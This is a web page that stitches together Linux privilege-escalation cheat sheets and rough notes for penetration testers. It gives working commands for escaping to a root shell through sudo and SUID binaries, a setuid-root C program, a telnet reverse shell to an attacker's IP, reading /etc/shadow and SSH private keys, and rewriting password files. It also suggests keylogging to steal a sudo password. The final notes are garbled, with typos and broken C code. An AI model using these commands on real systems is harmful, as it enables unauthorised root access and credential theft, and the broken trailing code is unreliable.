<h3>
<br>
<br>Privilege Escalation
<br>
<br>Once we have a limited shell it is useful to escalate that shells privileges. This way it will be easier to hide, read and write any files, and persist between reboots.
<br>
<br>In this chapter I am going to go over these common Linux privilege escalation techniques:
<br>
<br>    Kernel exploits
<br>    Programs running as root
<br>    Installed software
<br>    Weak/reused/plaintext passwords
<br>    Inside service
<br>    Suid misconfiguration
<br>    Abusing sudo-rights
<br>    World writable scripts invoked by root
<br>    Bad path configuration
<br>    Cronjobs
<br>    Unmounted filesystems
<br>
<br>Enumeration scripts
<br>
<br>I have used principally three scripts that are used to enumerate a machine. They are some difference between the scripts, but they output a lot of the same. So test them all out and see which one you like best.
<br>
<br>LinEnum
<br>
<br>https://github.com/rebootuser/LinEnum
<br>
<br>Here are the options:
<br>
<br>-k Enter keyword
<br>-e Enter export location
<br>-t Include thorough (lengthy) tests
<br>-r Enter report name
<br>-h Displays this help text
<br>
<br>Unix privesc
<br>
<br>http://pentestmonkey.net/tools/audit/unix-privesc-check
<br>Run the script and save the output in a file, and then grep for warning in it.
<br>
<br>Linprivchecker.py
<br>
<br>https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py
<br>Privilege Escalation Techniques
<br>Kernel Exploits
<br>
<br>By exploiting vulnerabilities in the Linux Kernel we can sometimes escalate our privileges. What we usually need to know to test if a kernel exploit works is the OS, architecture and kernel version.
<br>
<br>Check the following:
<br>
<br>OS:
<br>
<br>Architecture:
<br>
<br>Kernel version:
<br>
<br>uname -a
<br>cat /proc/version
<br>cat /etc/issue
<br>
<br>Search for exploits
<br>
<br>site:exploit-db.com kernel version
<br>
<br>python linprivchecker.py extended
<br>
<br>Don't use kernel exploits if you can avoid it. If you use it it might crash the machine or put it in an unstable state. So kernel exploits should be the last resort. Always use a simpler priv-esc if you can. They can also produce a lot of stuff in the sys.log. So if you find anything good, put it up on your list and keep searching for other ways before exploiting it.
<br>Programs running as root
<br>
<br>The idea here is that if specific service is running as root and you can make that service execute commands you can execute commands as root. Look for webserver, database or anything else like that. A typical example of this is mysql, example is below.
<br>
<br>Check which processes are running
<br>
<br># Metasploit
<br>ps
<br>
<br># Linux
<br>ps aux
<br>
<br>Mysql
<br>
<br>If you find that mysql is running as root and you username and password to log in to the database you can issue the following commands:
<br>
<br>select sys_exec('whoami');
<br>select sys_eval('whoami');
<br>
<br>If neither of those work you can use a User Defined Function/
<br>User Installed Software
<br>
<br>Has the user installed some third party software that might be vulnerable? Check it out. If you find anything google it for exploits.
<br>
<br># Common locations for user installed software
<br>/usr/local/
<br>/usr/local/src
<br>/usr/local/bin
<br>/opt/
<br>/home
<br>/var/
<br>/usr/src/
<br>
<br># Debian
<br>dpkg -l
<br>
<br># CentOS, OpenSuse, Fedora, RHEL
<br>rpm -qa (CentOS / openSUSE )
<br>
<br># OpenBSD, FreeBSD
<br>pkg_info
<br>
<br>Weak/reused/plaintext passwords
<br>
<br>    Check file where webserver connect to database (config.php or similar)
<br>    Check databases for admin passwords that might be reused
<br>    Check weak passwords
<br>
<br>username:username
<br>username:username1
<br>username:root
<br>username:admin
<br>username:qwerty
<br>username:password
<br>
<br>    Check plaintext password
<br>
<br># Anything interesting the the mail?
<br>/var/spool/mail
<br>
<br>./LinEnum.sh -t -k password
<br>
<br>Service only available from inside
<br>
<br>It might be that case that the user is running some service that is only available from that host. You can't connect to the service from the outside. It might be a development server, a database, or anything else. These services might be running as root, or they might have vulnerabilities in them. They might be even more vulnerable since the developer or user might be thinking "since it is only accessible for the specific user we don't need to spend that much of security".
<br>
<br>Check the netstat and compare it with the nmap-scan you did from the outside. Do you find more services available from the inside?
<br>
<br># Linux
<br>netstat -anlp
<br>netstat -ano
<br>
<br>Suid and Guid Misconfiguration
<br>
<br>When a binary with suid permission is run it is run as another user, and therefore with the other users privileges. It could be root, or just another user. If the suid-bit is set on a program that can spawn a shell or in another way be abuse we could use that to escalate our privileges.
<br>
<br>For example, these are some programs that can be used to spawn a shell:
<br>
<br>nmap
<br>vim
<br>less
<br>more
<br>
<br>If these programs have suid-bit set we can use them to escalate privileges too. For more of these and how to use the see the next section about abusing sudo-rights:
<br>
<br>nano
<br>cp
<br>mv
<br>find
<br>
<br>Find suid and guid files
<br>
<br>#Find SUID
<br>find / -perm -u=s -type f 2>/dev/null
<br>
<br>#Find GUID
<br>find / -perm -g=s -type f 2>/dev/null
<br>
<br>Abusing sudo-rights
<br>
<br>If you have a limited shell that has access to some programs using sudo you might be able to escalate your privileges with. Any program that can write or overwrite can be used. For example, if you have sudo-rights to cp you can overwrite /etc/shadow or /etc/sudoers with your own malicious file.
<br>
<br>awk
<br>
<br>awk 'BEGIN {system("/bin/bash")}'
<br>
<br>bash
<br>
<br>cp
<br>Copy and overwrite /etc/shadow
<br>
<br>find
<br>
<br>sudo find / -exec bash -i \;
<br>
<br>find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
<br>
<br>ht
<br>
<br>The text/binary-editor HT.
<br>
<br>less
<br>
<br>From less you can go into vi, and then into a shell.
<br>
<br>sudo less /etc/shadow
<br>v
<br>:shell
<br>
<br>more
<br>
<br>You need to run more on a file that is bigger than your screen.
<br>
<br>sudo more /home/pelle/myfile
<br>!/bin/bash
<br>
<br>mv
<br>
<br>Overwrite /etc/shadow or /etc/sudoers
<br>
<br>man
<br>
<br>nano
<br>
<br>nc
<br>
<br>nmap
<br>
<br>python/perl/ruby/lua/etc
<br>
<br>sudo perl
<br>exec "/bin/bash";
<br>ctr-d
<br>
<br>sudo python
<br>import os
<br>os.system("/bin/bash")
<br>
<br>sh
<br>
<br>tcpdump
<br>
<br>echo $'id\ncat /etc/shadow' > /tmp/.test
<br>chmod +x /tmp/.test
<br>sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
<br>
<br>vi/vim
<br>
<br>Can be abused like this:
<br>
<br>sudo vi
<br>:shell
<br>
<br>:set shell=/bin/bash:shell    
<br>:!bash
<br>
<br>How I got root with sudo/
<br>World writable scripts invoked as root
<br>
<br>If you find a script that is owned by root but is writable by anyone you can add your own malicious code in that script that will escalate your privileges when the script is run as root. It might be part of a cronjob, or otherwise automatized, or it might be run by hand by a sysadmin. You can also check scripts that are called by these scripts.
<br>
<br>#World writable files directories
<br>find / -writable -type d 2>/dev/null
<br>find / -perm -222 -type d 2>/dev/null
<br>find / -perm -o w -type d 2>/dev/null
<br>
<br># World executable folder
<br>find / -perm -o x -type d 2>/dev/null
<br>
<br># World writable and executable folders
<br>find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
<br>
<br>Bad path configuration
<br>
<br>Putting . in the path
<br>If you put a dot in your path you won't have to write ./binary to be able to execute it. You will be able to execute any script or binary that is in the current directory.
<br>
<br>Why do people/sysadmins do this? Because they are lazy and won't want to write ./.
<br>
<br>This explains it
<br>https://hackmag.com/security/reach-the-root/
<br>And here
<br>http://www.dankalia.com/tutor/01005/0100501004.htm
<br>Cronjob
<br>
<br>With privileges running script that are editable for other users.
<br>
<br>Look for anything that is owned by privileged user but writable for you:
<br>
<br>crontab -l
<br>ls -alh /var/spool/cron
<br>ls -al /etc/ | grep cron
<br>ls -al /etc/cron*
<br>cat /etc/cron*
<br>cat /etc/at.allow
<br>cat /etc/at.deny
<br>cat /etc/cron.allow
<br>cat /etc/cron.deny
<br>cat /etc/crontab
<br>cat /etc/anacrontab
<br>cat /var/spool/cron/crontabs/root
<br>
<br>Unmounted filesystems
<br>
<br>Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.
<br>
<br>mount -l
<br>cat /etc/fstab
<br>
<br>NFS Share
<br>
<br>If you find that a machine has a NFS share you might be able to use that to escalate privileges. Depending on how it is configured.
<br>
<br># First check if the target machine has any NFS shares
<br>showmount -e 192.168.1.101
<br>
<br># If it does, then mount it to you filesystem
<br>mount 192.168.1.101:/ /tmp/
<br>
<br>If that succeeds then you can go to /tmp/share. There might be some interesting stuff there. But even if there isn't you might be able to exploit it.
<br>
<br>If you have write privileges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says that it is the root-user that has created the file it is good news. Then you can create a file and set it with suid-permission from your attacking machine. And then execute it with your low privilege shell.
<br>
<br>This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the suid-bit on it, like this:
<br>
<br>chmod 4777 exploit
<br>
<br>#include <stdio.h>
<br>#include <stdlib.h>
<br>#include <sys/types.h>
<br>#include <unistd.h>
<br>
<br>int main()
<br>{
<br>    setuid(0);
<br>    system("/bin/bash");
<br>    return 0;
<br>}
<br>
<br>Steal password through a keylogger
<br>
<br>If you have access to an account with sudo-rights but you don't have its password you can install a keylogger to get it.
<br>Other useful stuff related to privesc
<br>
<br>World writable directories
<br>
<br>/tmp
<br>/var/tmp
<br>/dev/shm
<br>/var/spool/vbox
<br>/var/spool/samba
<br>
<br>References
<br>
<br>http://www.rebootuser.com/?p=1758
<br>
<br>http://netsec.ws/?p=309
<br>
<br>https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/
<br>
<br>Watch this video!
<br>http://www.irongeek.com/i.php?page=videos/bsidesaugusta2016/its-too-funky-in-here04-linux-privilege-escalation-for-fun-profit-and-all-around-mischief-jake-williams
<br>
<br>http://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections
<br>
<br>https://www.rebootuser.com/?page_id=1721
<br>
<br>Basic Linux Privilege Escalation
<br>
<br>Before starting, I would like to point out - I'm no expert. As far as I know, there isn't a "magic" answer, in this huge area. This is simply my finding, typed up, to be shared (my starting point). Below is a mixture of commands to do the same thing, to look at things in a different place or just a different light. I know there more "things" to look for. It's just a basic & rough guide. Not every command will work for each system as Linux varies so much. "It" will not jump off the screen - you've to hunt for that "little thing" as "the devil is in the detail".
<br>Enumeration is the key.
<br>
<br>(Linux) privilege escalation is all about:
<br>
<br>    Collect - Enumeration, more enumeration and some more enumeration.
<br>    Process - Sort through data, analyse and prioritisation.
<br>    Search - Know what to search for and where to find the exploit code.
<br>    Adapt - Customize the exploit, so it fits. Not every exploit work for every system "out of the box".
<br>    Try - Get ready for (lots of) trial and error.
<br>
<br>Operating System
<br>What's the distribution type? What version?
<br>
<br>1
<br>2
<br>3
<br>4
<br>
<br>	
<br>
<br>cat /etc/issue
<br>cat /etc/*-release
<br>  cat /etc/lsb-release      # Debian based
<br>  cat /etc/redhat-release   # Redhat based
<br>
<br>What's the kernel version? Is it 64-bit?
<br>
<br>1
<br>2
<br>3
<br>4
<br>5
<br>6
<br>
<br>	
<br>
<br>cat /proc/version
<br>uname -a
<br>uname -mrs
<br>rpm -q kernel
<br>dmesg | grep Linux
<br>ls /boot | grep vmlinuz-
<br>
<br>What can be learnt from the environmental variables?
<br>
<br>1
<br>2
<br>3
<br>4
<br>5
<br>6
<br>7
<br>
<br>	
<br>
<br>cat /etc/profile
<br>cat /etc/bashrc
<br>cat ~/.bash_profile
<br>cat ~/.bashrc
<br>cat ~/.bash_logout
<br>env
<br>set
<br>
<br>Is there a printer?
<br>
<br>1
<br>
<br>	
<br>
<br>lpstat -a
<br>
<br>Applications & Services
<br>What services are running? Which service has which user privilege?
<br>
<br>1
<br>2
<br>3
<br>4
<br>
<br>	
<br>
<br>ps aux
<br>ps -ef
<br>top
<br>cat /etc/services
<br>
<br>Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
<br>
<br>1
<br>2
<br>
<br>	
<br>
<br>ps aux | grep root
<br>ps -ef | grep root
<br>
<br>What applications are installed? What version are they? Are they currently running?
<br>
<br>1
<br>2
<br>3
<br>4
<br>5
<br>6
<br>
<br>	
<br>
<br>ls -alh /usr/bin/
<br>ls -alh /sbin/
<br>dpkg -l
<br>rpm -qa
<br>ls -alh /var/cache/apt/archivesO
<br>ls -alh /var/cache/yum/
<br>
<br>Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
<br>
<br>1
<br>2
<br>3
<br>4
<br>5
<br>6
<br>7
<br>8
<br>9
<br>10
<br>
<br>	
<br>
<br>cat /etc/syslog.conf
<br>cat /etc/chttp.conf
<br>cat /etc/lighttpd.conf
<br>cat /etc/cups/cupsd.conf
<br>cat /etc/inetd.conf
<br>cat /etc/apache2/apache2.conf
<br>cat /etc/my.conf
<br>cat /etc/httpd/conf/httpd.conf
<br>cat /opt/lampp/etc/httpd.conf
<br>ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
<br>
<br>What jobs are scheduled?
<br>
<br>1
<br>2
<br>3
<br>4
<br>5
<br>6
<br>7
<br>8
<br>9
<br>10
<br>11
<br>12
<br>
<br>	
<br>
<br>crontab -l
<br>ls -alh /var/spool/cron
<br>ls -al /etc/ | grep cron
<br>ls -al /etc/cron*
<br>cat /etc/cron*
<br>cat /etc/at.allow
<br>cat /etc/at.deny
<br>cat /etc/cron.allow
<br>cat /etc/cron.deny
<br>cat /etc/crontab
<br>cat /etc/anacrontab
<br>cat /var/spool/cron/crontabs/root
<br>
<br>Any plain text usernames and/or passwords?
<br>
<br>1
<br>2
<br>3
<br>4
<br>
<br>	
<br>
<br>grep -i user [filename]
<br>grep -i pass [filename]
<br>grep -C 5 "password" [filename]
<br>find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
<br>
<br>Communications & Networking
<br>What NIC(s) does the system have? Is it connected to another network?
<br>
<br>1
<br>2
<br>3
<br>
<br>	
<br>
<br>/sbin/ifconfig -a
<br>cat /etc/network/interfaces
<br>cat /etc/sysconfig/network
<br>
<br>What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?
<br>
<br>1
<br>2
<br>3
<br>4
<br>5
<br>6
<br>
<br>	
<br>
<br>cat /etc/resolv.conf
<br>cat /etc/sysconfig/network
<br>cat /etc/networks
<br>iptables -L
<br>hostname
<br>dnsdomainname
<br>
<br>What other users & hosts are communicating with the system?
<br>
<br>1
<br>2
<br>3
<br>4
<br>5
<br>6
<br>7
<br>8
<br>9
<br>10
<br>
<br>	
<br>
<br>lsof -i
<br>lsof -i :80
<br>grep 80 /etc/services
<br>netstat -antup
<br>netstat -antpx
<br>netstat -tulpn
<br>chkconfig --list
<br>chkconfig --list | grep 3:on
<br>last
<br>w
<br>
<br>Whats cached? IP and/or MAC addresses
<br>
<br>1
<br>2
<br>3
<br>
<br>	
<br>
<br>arp -e
<br>route
<br>/sbin/route -nee
<br>
<br>Is packet sniffing possible? What can be seen? Listen to live traffic
<br>
<br>1
<br>
<br>	
<br>
<br>tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
<br>
<br>Note: tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
<br>Have you got a shell? Can you interact with the system?
<br>
<br>1
<br>2
<br>3
<br>
<br>	
<br>
<br>nc -lvp 4444    # Attacker. Input (Commands)
<br>nc -lvp 4445    # Attacker. Ouput (Results)
<br>telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
<br>
<br>Note: http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
<br>Is port forwarding possible? Redirect and interact with traffic from another view
<br>
<br>Note: http://www.boutell.com/rinetd/
<br>
<br>Note: http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
<br>
<br>Note: http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip
<br>
<br>Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
<br>
<br>1
<br>
<br>	
<br>
<br>FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
<br>
<br>Note: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
<br>
<br>1
<br>2
<br>
<br>	
<br>
<br>ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
<br>ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
<br>
<br>Note: mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe
<br>
<br>1
<br>2
<br>3
<br>
<br>	
<br>
<br>mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Port Relay
<br>mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
<br>mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
<br>
<br>Is tunnelling possible? Send commands locally, remotely
<br>
<br>1
<br>2
<br>
<br>	
<br>
<br>ssh -D 127.0.0.1:9050 -N [username]@[ip]
<br>proxychains ifconfig
<br>
<br>Confidential Information & Users
<br>Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?
<br>
<br>1
<br>2
<br>3
<br>4
<br>5
<br>6
<br>7
<br>8
<br>9
<br>
<br>	
<br>
<br>id
<br>who
<br>w
<br>last
<br>cat /etc/passwd | cut -d: -f1    # List of users
<br>grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
<br>awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
<br>cat /etc/sudoers
<br>sudo -l
<br>
<br>What sensitive files can be found?
<br>
<br>1
<br>2
<br>3
<br>4
<br>
<br>	
<br>
<br>cat /etc/passwd
<br>cat /etc/group
<br>cat /etc/shadow
<br>ls -alh /var/mail/
<br>
<br>Anything "interesting" in the home directorie(s)? If it's possible to access
<br>
<br>1
<br>2
<br>
<br>	
<br>
<br>ls -ahlR /root/
<br>ls -ahlR /home/
<br>
<br>Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
<br>
<br>1
<br>2
<br>3
<br>
<br>	
<br>
<br>cat /var/apache2/config.inc
<br>cat /var/lib/mysql/mysql/user.MYD
<br>cat /root/anaconda-ks.cfg
<br>
<br>What has the user being doing? Is there any password in plain text? What have they been edting?
<br>
<br>1
<br>2
<br>3
<br>4
<br>5
<br>
<br>	
<br>
<br>cat ~/.bash_history
<br>cat ~/.nano_history
<br>cat ~/.atftp_history
<br>cat ~/.mysql_history
<br>cat ~/.php_history
<br>
<br>What user information can be found?
<br>
<br>1
<br>2
<br>3
<br>4
<br>
<br>	
<br>
<br>cat ~/.bashrc
<br>cat ~/.profile
<br>cat /var/mail/root
<br>cat /var/spool/mail/root
<br>
<br>Can private-key information be found?
<br>
<br>1
<br>2
<br>3
<br>4
<br>5
<br>6
<br>7
<br>8
<br>9
<br>10
<br>11
<br>12
<br>13
<br>14
<br>15
<br>
<br>	
<br>
<br>cat ~/.ssh/authorized_keys
<br>cat ~/.ssh/identity.pub
<br>cat ~/.ssh/identity
<br>cat ~/.ssh/id_rsa.pub
<br>cat ~/.ssh/id_rsa
<br>cat ~/.ssh/id_dsa.pub
<br>cat ~/.ssh/id_dsa
<br>cat /etc/ssh/ssh_config
<br>cat /etc/ssh/sshd_config
<br>cat /etc/ssh/ssh_host_dsa_key.pub
<br>cat /etc/ssh/ssh_host_dsa_key
<br>cat /etc/ssh/ssh_host_rsa_key.pub
<br>cat /etc/ssh/ssh_host_rsa_key
<br>cat /etc/ssh/ssh_host_key.pub
<br>cat /etc/ssh/ssh_host_key
<br>
<br>File Systems
<br>Which configuration files can be written in /etc/? Able to reconfigure a service?
<br>
<br>1
<br>2
<br>3
<br>4
<br>5
<br>6
<br>7
<br>
<br>	
<br>
<br>ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
<br>ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
<br>ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
<br>ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
<br>
<br>find /etc/ -readable -type f 2>/dev/null               # Anyone
<br>find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
<br>
<br>What can be found in /var/ ?
<br>
<br>1
<br>2
<br>3
<br>4
<br>5
<br>6
<br>7
<br>
<br>	
<br>
<br>ls -alh /var/log
<br>ls -alh /var/mail
<br>ls -alh /var/spool
<br>ls -alh /var/spool/lpd
<br>ls -alh /var/lib/pgsql
<br>ls -alh /var/lib/mysql
<br>cat /var/lib/dhcp3/dhclient.leases
<br>
<br>Any settings/files (hidden) on website? Any settings file with database information?
<br>
<br>1
<br>2
<br>3
<br>4
<br>5
<br>
<br>	
<br>
<br>ls -alhR /var/www/
<br>ls -alhR /srv/www/htdocs/
<br>ls -alhR /usr/local/www/apache22/data/
<br>ls -alhR /opt/lampp/htdocs/
<br>ls -alhR /var/www/html/
<br>
<br>Is there anything in the log file(s) (Could help with "Local File Includes"!)
<br>
<br>1
<br>2
<br>3
<br>4
<br>5
<br>6
<br>7
<br>8
<br>9
<br>10
<br>11
<br>12
<br>13
<br>14
<br>15
<br>16
<br>17
<br>18
<br>19
<br>20
<br>21
<br>22
<br>23
<br>24
<br>25
<br>26
<br>27
<br>28
<br>29
<br>30
<br>31
<br>32
<br>33
<br>34
<br>35
<br>36
<br>37
<br>38
<br>39
<br>40
<br>
<br>	
<br>
<br>cat /etc/httpd/logs/access_log
<br>cat /etc/httpd/logs/access.log
<br>cat /etc/httpd/logs/error_log
<br>cat /etc/httpd/logs/error.log
<br>cat /var/log/apache2/access_log
<br>cat /var/log/apache2/access.log
<br>cat /var/log/apache2/error_log
<br>cat /var/log/apache2/error.log
<br>cat /var/log/apache/access_log
<br>cat /var/log/apache/access.log
<br>cat /var/log/auth.log
<br>cat /var/log/chttp.log
<br>cat /var/log/cups/error_log
<br>cat /var/log/dpkg.log
<br>cat /var/log/faillog
<br>cat /var/log/httpd/access_log
<br>cat /var/log/httpd/access.log
<br>cat /var/log/httpd/error_log
<br>cat /var/log/httpd/error.log
<br>cat /var/log/lastlog
<br>cat /var/log/lighttpd/access.log
<br>cat /var/log/lighttpd/error.log
<br>cat /var/log/lighttpd/lighttpd.access.log
<br>cat /var/log/lighttpd/lighttpd.error.log
<br>cat /var/log/messages
<br>cat /var/log/secure
<br>cat /var/log/syslog
<br>cat /var/log/wtmp
<br>cat /var/log/xferlog
<br>cat /var/log/yum.log
<br>cat /var/run/utmp
<br>cat /var/webmin/miniserv.log
<br>cat /var/www/logs/access_log
<br>cat /var/www/logs/access.log
<br>ls -alh /var/lib/dhcp3/
<br>ls -alh /var/log/postgresql/
<br>ls -alh /var/log/proftpd/
<br>ls -alh /var/log/samba/
<br>
<br>Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
<br>
<br>Note: http://www.thegeekstuff.com/2011/08/linux-var-log-files/
<br>If commands are limited, you break out of the "jail" shell?
<br>
<br>1
<br>2
<br>3
<br>
<br>	
<br>
<br>python -c 'import pty;pty.spawn("/bin/bash")'
<br>echo os.system('/bin/bash')
<br>/bin/sh -i
<br>
<br>How are file-systems mounted?
<br>
<br>1
<br>2
<br>
<br>	
<br>
<br>mount
<br>df -h
<br>
<br>Are there any unmounted file-systems?
<br>
<br>1
<br>
<br>	
<br>
<br>cat /etc/fstab
<br>
<br>What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
<br>
<br>1
<br>2
<br>3
<br>4
<br>5
<br>6
<br>7
<br>8
<br>9
<br>
<br>	
<br>
<br>find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
<br>find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
<br>find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
<br>
<br>find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
<br>for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
<br>
<br># find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
<br>find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
<br>
<br>Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
<br>
<br>1
<br>2
<br>3
<br>4
<br>5
<br>6
<br>7
<br>
<br>	
<br>
<br>find / -writable -type d 2>/dev/null      # world-writeable folders
<br>find / -perm -222 -type d 2>/dev/null     # world-writeable folders
<br>find / -perm -o w -type d 2>/dev/null     # world-writeable folders
<br>
<br>find / -perm -o x -type d 2>/dev/null     # world-executable folders
<br>
<br>find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
<br>
<br>Any "problem" files? Word-writeable, "nobody" files
<br>
<br>1
<br>2
<br>
<br>	
<br>
<br>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
<br>find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
<br>
<br>Preparation & Finding Exploit Code
<br>What development tools/languages are installed/supported?
<br>
<br>1
<br>2
<br>3
<br>4
<br>
<br>	
<br>
<br>find / -name perl*
<br>find / -name python*
<br>find / -name gcc*
<br>find / -name cc
<br>
<br>How can files be uploaded?
<br>
<br>1
<br>2
<br>3
<br>4
<br>5
<br>
<br>	
<br>
<br>find / -name wget
<br>find / -name nc*
<br>find / -name netcat*
<br>find / -name tftp*
<br>find / -name ftp
<br>
<br>Finding exploit code
<br>
<br>http://www.exploit-db.com
<br>
<br>http://1337day.com
<br>
<br>http://www.securiteam.com
<br>
<br>http://www.securityfocus.com
<br>
<br>http://www.exploitsearch.net
<br>
<br>http://metasploit.com/modules/
<br>
<br>http://securityreason.com
<br>
<br>http://seclists.org/fulldisclosure/
<br>
<br>http://www.google.com
<br>Finding more information regarding the exploit
<br>
<br>http://www.cvedetails.com
<br>
<br>http://packetstormsecurity.org/files/cve/[CVE]
<br>
<br>http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]
<br>
<br>http://www.vulnview.com/cve-details.php?cvename=[CVE]
<br>(Quick) "Common" exploits. Warning. Pre-compiled binaries files. Use at your own risk
<br>
<br>http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/
<br>
<br>http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/
<br>Mitigations
<br>Is any of the above information easy to find?
<br>
<br>Try doing it! Setup a cron job which automates script(s) and/or 3rd party products
<br>Is the system fully patched?
<br>
<br>Kernel, operating system, all applications, their plugins and web services
<br>
<br>1
<br>2
<br>
<br>	
<br>
<br>apt-get update && apt-get upgrade
<br>yum update
<br>
<br>Are services running with the minimum level of privileges required?
<br>
<br>For example, do you need to run MySQL as root?
<br>Scripts Can any of this be automated?!
<br>
<br>http://pentestmonkey.net/tools/unix-privesc-check/
<br>
<br>http://labs.portcullis.co.uk/application/enum4linux/
<br>
<br>http://bastille-linux.sourceforge.net
<br>Other (quick) guides & Links
<br>Enumeration
<br>
<br>http://www.0daysecurity.com/penetration-testing/enumeration.html
<br>
<br>http://www.microloft.co.uk/hacking/hacking3.htm
<br>Misc
<br>
<br>http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf
<br>
<br>http://pentest.cryptocity.net/files/operations/2009/post_exploitation_fall09.pdf
<br>
<br>http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html
<br>
<br>Posted by g0tmi1kAug 2nd, 2011 12:00 am bypassing, commands, privilege escalation becareful that the incedent that is going to be reported
<br>
<br>open 2 shells
<br>
<br>see /etc/passwd for read or write permision (if you have the writable permission replace 'x' with the hash using cmd "mkpasswd -m sha512 (enter your password here)") if you are able to append the file then add a new user with the id of root 0:0
<br>
<br>see /etc/shadow for read or write permision (note it uses mostly sha512 you can crack it using john)(if you have the writable permission replace the hash using cmd "mkpasswd -m sha512 (enter your password here)")
<br>
<br>use LinEnum save the data
<br>
<br>use Linux Smart Enumeration save the data
<br>
<br>use Linux privchecker save the data
<br>
<br>use BeRoot save the data
<br>
<br>the following command will get the programs that are running as root
<br>
<br>	"$ ps aux | grep "^root""
<br>
<br>	this command will show the version of the following program
<br>
<br>	' <program> -v (or) --version' ,  you can also use cmd 'dpkg -l 'in debian and in rpm use rpm and pacman apt etc
<br>
<br>
<br>use unix privese check save the data
<br>
<br>suid and sgid enum
<br>	
<br>	->use the folloing cmd to find all files "find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null"
<br>	->exploit them using https://gtfobins.github.io/ 
<br>	->if any program has exploit just run it and get root shell use google searchsploit etc...
<br>	->exicute this cmd if any windows new line charactor is present 'sed -i -e "s/^M//" <program wich has windows new line cractor>'
<br>	->use this command to look the non existing file wich we can run cmd= $ strace <full path ofthe program> 2>&1 | grep -iE "open| access | no such file" 
<br>	->take any one of the file and then replace with this code
<br>		
<br>		#include <stdio.h>
<br>		#include <stdlib.h>
<br>		static void inject() __attribute__ ((constructor)):
<br>		void inject(){
<br>			setuid(0);
<br>			system("/bin/bash -p);
<br>		}
<br>
<br>	->save this file as the name of the missing file and then compile it by 
<br>	->cmd $ gcc -shared -fPIC -o <filename>.so <filename>.c
<br> 	->now run the program
<br>	
<br>	(OR)
<br>
<br>	->run strings command on the following exicutaable binanrylike this 	
<br>		$ strings /path/to/file;strace -v -f -e execve <path of the program> 2>&1 | grep <part of thecommand eg in 'service start apache2' put only 'service'>
<br>	->see if any direct command is used if s you can replace it or create a c program of the same command name and change the "PATH=. " and side by side run the program 
<br>	
<br>	(OR)
<br>
<br>	->run strings command on the following exicutaable binanrylike this 	
<br>	$ strings /path/to/file;strace -v -f -e execve <path of the program> 2>&1 | grep <part of thecommand eg in 'service start apache2' put only 'service'>
